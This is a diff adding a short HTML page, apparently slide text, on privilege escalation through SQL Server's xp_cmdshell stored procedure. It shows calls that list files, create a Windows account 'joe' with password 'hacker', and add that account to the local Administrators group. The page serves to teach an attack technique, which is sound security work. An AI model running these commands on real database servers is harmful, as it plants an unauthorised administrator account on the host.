@@ -1,0 +1,19 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Escalation with xp_cmdshell</title>
+</head><body>Privilege escalation with xp_cmdshell stored procedure<br/>
+Executes a command as an operating system command shell and returns the output<br/>
+&nbsp;EXEC master.dbo.xp_cmdshell ‘dir c:\*.*’<br/>
+&nbsp;Same as doing a “dir” at the DOS prompt!!!<br/>
+&nbsp;Executes a native operating system common on the host system<br/>
+&nbsp;The possibilities are endless…<br/>
+<br/>
+Privilege escalation with xp_cmdshell stored procedure<br/>
+Adding a Windows account “joe” with a password of “hacker”<br/>
+&nbsp;Xp_cmdshell ‘net user &lt;username&gt; &lt;password&gt; /ADD’<br/>
+&nbsp;Xp_cmdshell ‘net user joe hacker /ADD’<br/>
+Adding a “joe” to the administrators group!<br/>
+&nbsp;Xp_cmdshell ‘net localgroup /ADD Administrators &lt;username&gt;’<br/>
+&nbsp;Xp_cmdshell ‘net localgroup /ADD Administrators joe’</body></html>
